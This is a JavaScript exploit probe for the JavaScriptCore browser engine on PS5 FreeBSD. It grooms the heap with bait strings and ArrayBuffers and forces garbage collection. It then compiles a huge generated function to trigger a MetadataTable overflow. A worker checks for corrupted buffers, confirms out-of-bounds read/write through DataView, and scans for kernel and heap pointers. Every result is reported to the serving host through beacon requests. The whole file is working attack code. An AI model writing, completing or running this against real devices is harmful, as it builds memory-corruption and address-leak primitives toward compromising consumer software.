// p173 — ArrayBuffer Adjacency Corruption Check
//
// THEORY: MetadataTable overflow writes FORWARD in heap. Bait-and-switch
// puts targets above the metadata buffer. On PS5 FreeBSD, Gigacage is
// DISABLED — ArrayBuffer backing stores live in the same FastMalloc heap
// as MetadataTable and JSString cells.
//
// If the sweep corrupts an ArrayBuffer's HEADER (the JSC::ArrayBuffer
// object in MarkedSpace), the byteLength field could change. A LARGER
// byteLength gives DataView an OOB read/write — far more powerful than
// charCodeAt on corrupted strings.
//
// If the sweep corrupts ArrayBuffer BACKING STORE data, DataView reads
// return metadata entry bytes — code pointers, bytecodeIndex, etc.
//
// TWO VARIANTS:
//   A) 14 ArrayBuffers x 100KB — same marge slot size as metadata buffer
//   B) 14 ArrayBuffers x 112B  — matches metadata entry stride exactly,
//      lands in a smaller size class where type confusion is more likely
//
// Allocator chain (README):
//   MetadataTableMalloc = FastMalloc (not IsoHeap)
//   FastMalloc = libpas bmalloc
//   ArrayBuffer backing = FastMalloc (Gigacage off on FreeBSD)
//   All in the same allocator namespace
//
// Beacon prefix: V173-

(function() {
  var BASE = location.protocol + '//' + location.host;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V173-' + tag + '?t=' + Date.now(), true);
      x.send();
    } catch(e) {}
  }
  function BP(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V173-' + tag + '?t=' + Date.now(), true);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send(body);
    } catch(e) {}
  }

  B('BOOT');

  // ── WORKER ──
  var workerCode = function() {
    var baseUrl = '';

    // Variant A: large buffers (100KB)
    var largeBufs = [];
    var largeViews = [];
    var largeOrigLen = [];
    var LARGE_SIZE = 100000;

    // Variant B: stride-sized buffers (112 bytes)
    var smallBufs = [];
    var smallViews = [];
    var smallOrigLen = [];
    var SMALL_SIZE = 112;

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('GET', baseUrl + '/beacon/V173-W-' + tag + '?t=' + Date.now(), true);
        x.send();
      } catch(e) {}
    }
    function beaconPost(tag, body) {
      try {
        var x = new XMLHttpRequest();
        x.open('POST', baseUrl + '/beacon/V173-W-' + tag + '?t=' + Date.now(), true);
        x.setRequestHeader('Content-Type', 'text/plain');
        x.send(body);
      } catch(e) {}
    }
    function hx8(v) {
      var s = (v >>> 0).toString(16);
      while (s.length < 8) s = '0' + s;
      return s;
    }
    function hx2(v) {
      var s = (v & 0xff).toString(16);
      return s.length < 2 ? '0' + s : s;
    }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') {
        baseUrl = e.data.baseUrl;
        beacon('ALIVE');
        return;
      }

      if (e.data.cmd === 'alloc') {
        // Allocate large ArrayBuffers (Variant A)
        var countLarge = e.data.countLarge;
        for (var i = 0; i < countLarge; i++) {
          try {
            var buf = new ArrayBuffer(LARGE_SIZE);
            var view = new DataView(buf);
            // Fill with canary pattern 0xCC so we can detect overwrites
            var u8 = new Uint8Array(buf);
            for (var j = 0; j < LARGE_SIZE; j++) u8[j] = 0xCC;
            largeBufs.push(buf);
            largeViews.push(view);
            largeOrigLen.push(buf.byteLength);
          } catch(ex) {
            beacon('ALLOC-LARGE-ERR-' + i);
          }
        }
        beacon('LARGE-' + largeBufs.length + 'x' + LARGE_SIZE);

        // Allocate small ArrayBuffers (Variant B) — stride-matched
        var countSmall = e.data.countSmall;
        for (var i = 0; i < countSmall; i++) {
          try {
            var buf = new ArrayBuffer(SMALL_SIZE);
            var view = new DataView(buf);
            var u8 = new Uint8Array(buf);
            for (var j = 0; j < SMALL_SIZE; j++) u8[j] = 0xDD;
            smallBufs.push(buf);
            smallViews.push(view);
            smallOrigLen.push(buf.byteLength);
          } catch(ex) {
            beacon('ALLOC-SMALL-ERR-' + i);
          }
        }
        beacon('SMALL-' + smallBufs.length + 'x' + SMALL_SIZE);

        self.postMessage({ ready: true });
        return;
      }

      if (e.data.cmd === 'watch') {
        beacon('WATCHING');

        var found = false;
        var iters = 0;

        // ── POLL: check for ANY corruption in either variant ──
        // Large buffers: check byteLength AND data
        // Small buffers: check byteLength AND data
        while (!found) {
          // Check large buffers
          for (var i = 0; i < largeBufs.length; i++) {
            try {
              // Header corruption: byteLength changed
              if (largeBufs[i].byteLength !== largeOrigLen[i]) {
                beacon('LARGE-BYTELEN-' + i + '-was=' + largeOrigLen[i] + '-now=' + largeBufs[i].byteLength);
                found = true;
                break;
              }
              // Data corruption: canary overwritten
              if (largeViews[i].getUint32(0, true) !== 0xCCCCCCCC ||
                  largeViews[i].getUint32(24, true) !== 0xCCCCCCCC ||
                  largeViews[i].getUint32(56, true) !== 0xCCCCCCCC ||
                  largeViews[i].getUint32(100, true) !== 0xCCCCCCCC) {
                beacon('LARGE-DATA-' + i);
                found = true;
                break;
              }
            } catch(ex) {
              beacon('LARGE-POLL-EX-' + i + '-' + String(ex).substring(0, 30));
              found = true;
              break;
            }
          }
          if (found) break;

          // Check small buffers
          for (var i = 0; i < smallBufs.length; i++) {
            try {
              if (smallBufs[i].byteLength !== smallOrigLen[i]) {
                beacon('SMALL-BYTELEN-' + i + '-was=' + smallOrigLen[i] + '-now=' + smallBufs[i].byteLength);
                found = true;
                break;
              }
              if (smallViews[i].getUint32(0, true) !== 0xDDDDDDDD ||
                  smallViews[i].getUint32(28, true) !== 0xDDDDDDDD ||
                  smallViews[i].getUint32(56, true) !== 0xDDDDDDDD ||
                  smallViews[i].getUint32(84, true) !== 0xDDDDDDDD) {
                beacon('SMALL-DATA-' + i);
                found = true;
                break;
              }
            } catch(ex) {
              beacon('SMALL-POLL-EX-' + i + '-' + String(ex).substring(0, 30));
              found = true;
              break;
            }
          }

          iters++;
          if (iters % 500000 === 0) beacon('POLL-' + iters);
          if (iters > 50000000) { beacon('TIMEOUT'); return; }
        }

        beacon('CORRUPTION-DETECTED-iter=' + iters);

        // ══════════════════════════════════════════════════════════════
        // ── SCAN VARIANT A: LARGE BUFFERS (100KB) ──
        // ══════════════════════════════════════════════════════════════
        var largeSurvived = 0;
        var largeHeaderCorrupt = 0;
        var largeDataCorrupt = 0;

        for (var i = 0; i < largeBufs.length; i++) {
          try {
            var curLen = largeBufs[i].byteLength;
            var origLen = largeOrigLen[i];

            // ── CHECK 1: byteLength changed? ──
            if (curLen !== origLen) {
              largeHeaderCorrupt++;
              beacon('LA-HDR-' + i + '-orig=' + origLen + '-now=' + curLen);

              // byteLength INCREASED — this is the jackpot: OOB DataView
              if (curLen > origLen) {
                beacon('LA-OOB-' + i + '-extra=' + (curLen - origLen));
                try {
                  // Create a NEW DataView on the buffer with expanded length
                  var oobView = new DataView(largeBufs[i]);
                  // Read past original bounds — OOB read!
                  var oobHex = '';
                  var readEnd = Math.min(curLen, origLen + 256);
                  for (var off = origLen; off < readEnd; off += 4) {
                    try {
                      oobHex += hx8(oobView.getUint32(off, true));
                    } catch(re) { oobHex += 'XXXXXXXX'; break; }
                  }
                  beacon('LA-OOBRD-' + i + '-A=' + oobHex.substring(0, 200));
                  if (oobHex.length > 200) beacon('LA-OOBRD-' + i + '-B=' + oobHex.substring(200, 400));

                  // Try writing to OOB region to confirm write capability
                  try {
                    var testOff = origLen + 8;
                    var before = oobView.getUint32(testOff, true);
                    oobView.setUint32(testOff, 0xDEADBEEF, true);
                    var after = oobView.getUint32(testOff, true);
                    oobView.setUint32(testOff, before, true); // restore
                    if (after === 0xDEADBEEF) {
                      beacon('LA-OOBWR-' + i + '-CONFIRMED');
                    } else {
                      beacon('LA-OOBWR-' + i + '-READBACK=' + hx8(after));
                    }
                  } catch(we) {
                    beacon('LA-OOBWR-' + i + '-EX=' + String(we).substring(0, 30));
                  }
                } catch(oe) {
                  beacon('LA-OOB-EX-' + i + '-' + String(oe).substring(0, 30));
                }
              }

              // byteLength DECREASED — truncated, interesting but less useful
              if (curLen < origLen && curLen > 0) {
                beacon('LA-SHRUNK-' + i + '-to=' + curLen);
                try {
                  var shrView = new DataView(largeBufs[i]);
                  var shrHex = '';
                  for (var off = 0; off < Math.min(curLen, 128); off += 4) {
                    shrHex += hx8(shrView.getUint32(off, true));
                  }
                  beacon('LA-SHRDAT-' + i + '=' + shrHex.substring(0, 200));
                } catch(se) {}
              }
              continue;
            }

            // ── CHECK 2: byteLength intact — check backing store data ──
            var view = largeViews[i];
            var dataCorrupt = false;

            // Scan first 128 bytes for canary violations
            for (var off = 0; off < 128; off += 4) {
              try {
                if (view.getUint32(off, true) !== 0xCCCCCCCC) {
                  dataCorrupt = true;
                  break;
                }
              } catch(de) { dataCorrupt = true; break; }
            }

            if (dataCorrupt) {
              largeDataCorrupt++;
              beacon('LA-DAT-' + i);

              // Dump first 128 bytes of corrupted backing store
              var hex = '';
              for (var off = 0; off < 128; off += 4) {
                try {
                  hex += hx8(view.getUint32(off, true));
                } catch(he) { hex += 'XXXXXXXX'; break; }
              }
              beacon('LA-D128-' + i + '-A=' + hex.substring(0, 200));
              if (hex.length > 200) beacon('LA-D128-' + i + '-B=' + hex.substring(200));

              // Extract code pointers at metadata entry offsets
              // m_slowPathCallDestination at entry+24 (8 bytes)
              // Stride = 112 bytes per entry
              var ptrs = '';
              for (var entry = 0; entry < 4; entry++) {
                var base = entry * 112;
                if (base + 32 > origLen) break;
                try {
                  var lo = view.getUint32(base + 24, true);
                  var hi = view.getUint32(base + 28, true);
                  ptrs += 'e' + entry + ':' + hx8(hi) + hx8(lo) + ',';
                } catch(pe) {}
              }
              if (ptrs) beacon('LA-PTRS-' + i + '=' + ptrs);

              // m_bytecodeIndex at entry+68 (4 bytes)
              var idxs = '';
              for (var entry = 0; entry < 4; entry++) {
                var base = entry * 112;
                if (base + 72 > origLen) break;
                try {
                  idxs += 'e' + entry + ':' + hx8(view.getUint32(base + 68, true)) + ',';
                } catch(ie) {}
              }
              if (idxs) beacon('LA-IDX-' + i + '=' + idxs);
            } else {
              largeSurvived++;
            }
          } catch(ex) {
            beacon('LA-SCANEX-' + i + '-' + String(ex).substring(0, 30));
          }
        }

        beacon('LA-SUMMARY-surv=' + largeSurvived + '-hdr=' + largeHeaderCorrupt + '-dat=' + largeDataCorrupt);

        // ══════════════════════════════════════════════════════════════
        // ── SCAN VARIANT B: SMALL BUFFERS (112 bytes, stride-matched) ──
        // ══════════════════════════════════════════════════════════════
        var smallSurvived = 0;
        var smallHeaderCorrupt = 0;
        var smallDataCorrupt = 0;

        for (var i = 0; i < smallBufs.length; i++) {
          try {
            var curLen = smallBufs[i].byteLength;
            var origLen = smallOrigLen[i];

            // ── CHECK 1: byteLength changed? ──
            if (curLen !== origLen) {
              smallHeaderCorrupt++;
              beacon('SB-HDR-' + i + '-orig=' + origLen + '-now=' + curLen);

              if (curLen > origLen) {
                beacon('SB-OOB-' + i + '-extra=' + (curLen - origLen));
                try {
                  var oobView = new DataView(smallBufs[i]);
                  var oobHex = '';
                  var readEnd = Math.min(curLen, origLen + 256);
                  for (var off = origLen; off < readEnd; off += 4) {
                    try {
                      oobHex += hx8(oobView.getUint32(off, true));
                    } catch(re) { oobHex += 'XXXXXXXX'; break; }
                  }
                  beacon('SB-OOBRD-' + i + '-A=' + oobHex.substring(0, 200));
                  if (oobHex.length > 200) beacon('SB-OOBRD-' + i + '-B=' + oobHex.substring(200, 400));

                  // OOB write test
                  try {
                    var testOff = origLen;
                    if (testOff + 4 <= curLen) {
                      var before = oobView.getUint32(testOff, true);
                      oobView.setUint32(testOff, 0xDEADBEEF, true);
                      var after = oobView.getUint32(testOff, true);
                      oobView.setUint32(testOff, before, true);
                      if (after === 0xDEADBEEF) {
                        beacon('SB-OOBWR-' + i + '-CONFIRMED');
                      } else {
                        beacon('SB-OOBWR-' + i + '-READBACK=' + hx8(after));
                      }
                    }
                  } catch(we) {
                    beacon('SB-OOBWR-' + i + '-EX=' + String(we).substring(0, 30));
                  }
                } catch(oe) {
                  beacon('SB-OOB-EX-' + i + '-' + String(oe).substring(0, 30));
                }
              }

              if (curLen < origLen && curLen > 0) {
                beacon('SB-SHRUNK-' + i + '-to=' + curLen);
              }
              continue;
            }

            // ── CHECK 2: data corruption with intact byteLength ──
            var view = smallViews[i];
            var dataCorrupt = false;

            for (var off = 0; off < SMALL_SIZE; off += 4) {
              try {
                if (view.getUint32(off, true) !== 0xDDDDDDDD) {
                  dataCorrupt = true;
                  break;
                }
              } catch(de) { dataCorrupt = true; break; }
            }

            if (dataCorrupt) {
              smallDataCorrupt++;
              beacon('SB-DAT-' + i);

              // Dump full 112 bytes — one complete metadata entry
              var hex = '';
              for (var off = 0; off < SMALL_SIZE; off += 4) {
                try {
                  hex += hx8(view.getUint32(off, true));
                } catch(he) { hex += 'XXXXXXXX'; break; }
              }
              beacon('SB-FULL-' + i + '-A=' + hex.substring(0, 200));
              if (hex.length > 200) beacon('SB-FULL-' + i + '-B=' + hex.substring(200));

              // Code pointer at offset 24
              try {
                var lo = view.getUint32(24, true);
                var hi = view.getUint32(28, true);
                beacon('SB-PTR-' + i + '=' + hx8(hi) + hx8(lo));
              } catch(pe) {}

              // bytecodeIndex at offset 68
              try {
                beacon('SB-IDX-' + i + '=' + hx8(view.getUint32(68, true)));
              } catch(ie) {}
            } else {
              smallSurvived++;
            }
          } catch(ex) {
            beacon('SB-SCANEX-' + i + '-' + String(ex).substring(0, 30));
          }
        }

        beacon('SB-SUMMARY-surv=' + smallSurvived + '-hdr=' + smallHeaderCorrupt + '-dat=' + smallDataCorrupt);

        // ══════════════════════════════════════════════════════════════
        // ── FINAL: scan for heap/kernel pointer patterns across all ──
        // ══════════════════════════════════════════════════════════════
        var ptrReport = '';
        for (var i = 0; i < largeBufs.length; i++) {
          try {
            if (largeBufs[i].byteLength < 128) continue;
            var v = largeViews[i];
            for (var off = 0; off < 448; off += 4) {
              try {
                var hi = v.getUint32(off + 4, true);
                var lo = v.getUint32(off, true);
                // Kernel text: 0xffffffff8xxxxxxx
                if ((hi >>> 16) === 0xffff && lo !== 0) {
                  ptrReport += 'L' + i + '@' + off + ':' + hx8(hi) + hx8(lo) + ',';
                }
                // Heap pointer: upper 16 bits nonzero but small
                if (hi !== 0 && hi < 0x00010000 && lo !== 0 &&
                    v.getUint32(off, true) !== 0xCCCCCCCC &&
                    v.getUint32(off + 4, true) !== 0xCCCCCCCC) {
                  ptrReport += 'L' + i + 'h@' + off + ':' + hx8(hi) + hx8(lo) + ',';
                }
              } catch(pe) {}
            }
          } catch(le) {}
        }
        if (ptrReport) {
          beacon('PTRS-A=' + ptrReport.substring(0, 200));
          if (ptrReport.length > 200) beacon('PTRS-B=' + ptrReport.substring(200, 400));
          if (ptrReport.length > 400) beacon('PTRS-C=' + ptrReport.substring(400, 600));
        } else {
          beacon('PTRS-NONE');
        }

        beacon('DONE');
      }
    };
  };

  var workerBlob = new Blob(
    ['(' + workerCode.toString() + ')()'],
    { type: 'application/javascript' }
  );
  var worker = new Worker(URL.createObjectURL(workerBlob));
  worker.postMessage({ cmd: 'init', baseUrl: BASE });

  // ── PHASE 1: BAIT STRINGS (Primary/marge heap) ──
  // 20 x 100KB strings to fill low marge pages.
  // Same size class as metadata buffer (~102,400 byte slot).
  var N_BAIT = 20;
  var STR_LEN = 100000;

  B('BAIT-START');
  var baits = [];
  var baitChunk = '';
  for (var k = 0; k < 100; k++) baitChunk += 'BBBBBBBBBB';
  for (var i = 0; i < N_BAIT; i++) {
    var bait = '';
    for (var j = 0; j < STR_LEN; j += 1000) bait += baitChunk;
    bait = bait.substring(0, STR_LEN);
    bait.charCodeAt(0); // force StringImpl materialization
    baits.push(bait);
  }
  baitChunk = null;
  B('BAIT-DONE-' + N_BAIT);

  // ── PHASE 2: WORKER ALLOCATES TARGET ARRAYBUFFERS ──
  // Allocated AFTER baits → higher heap addresses → in the sweep path.
  // Variant A: 14 x 100KB (same marge size class as metadata + baits)
  // Variant B: 14 x 112B  (stride-matched, smaller size class)
  worker.onmessage = function(e) {
    if (e.data.ready) phaseFreeBaits();
  };
  B('WORKER-ALLOC');
  worker.postMessage({ cmd: 'alloc', countLarge: 14, countSmall: 14 });

  // ── PHASE 3: FREE BAITS + GC PRESSURE ──
  function phaseFreeBaits() {
    B('FREE-START');
    for (var i = 0; i < baits.length; i++) baits[i] = null;
    baits = null;

    var gcRound = 0;
    function gcPressureRound() {
      // Churn ephemeral objects to trigger eden + full GC
      for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
      for (var j = 0; j < 500; j++) new Array(100).fill(gcRound);
      gcRound++;

      if (gcRound < 30) {
        setTimeout(gcPressureRound, 30);
      } else {
        B('GC-DONE-' + gcRound);
        phaseBuildOverflow();
      }
    }
    gcPressureRound();
  }

  // ── PHASE 4: BUILD OVERFLOW SCRIPT ──
  function phaseBuildOverflow() {
    B('BUILD-START');

    // Start worker watching BEFORE compilation so it catches early writes
    worker.postMessage({ cmd: 'watch' });

    var N_OVERFLOW = 38348816;
    var CHUNK = 4000000;
    var CHUNKS = Math.floor(N_OVERFLOW / CHUNK);
    var REM = N_OVERFLOW - CHUNKS * CHUNK;

    var callChunk = '';
    for (var c = 0; c < CHUNK; c++) callChunk += 'a();';
    var remChunk = '';
    for (var r = 0; r < REM; r++) remChunk += 'a();';

    var parts = ['window.__v173fn=function(a){'];
    for (var ch = 0; ch < CHUNKS; ch++) parts.push(callChunk);
    parts.push(remChunk);
    parts.push('};window.__v173ok=true;');

    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB-' + (blob.size / 1024 / 1024).toFixed(0) + 'MB');
    callChunk = null;
    remChunk = null;
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');

    sc.onload = function() {
      B('COMPILED-' + (window.__v173ok ? 'OK' : 'FAIL'));
      if (!window.__v173fn) { B('NO-FN'); return; }

      // ── PHASE 5: TRIGGER OVERFLOW ──
      setTimeout(function() {
        B('CALLING');
        try {
          window.__v173fn(function(){});
        } catch(ex) {
          B('CATCH-' + String(ex).substring(0, 40));
        }
        B('SURVIVED');
      }, 500);
    };

    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
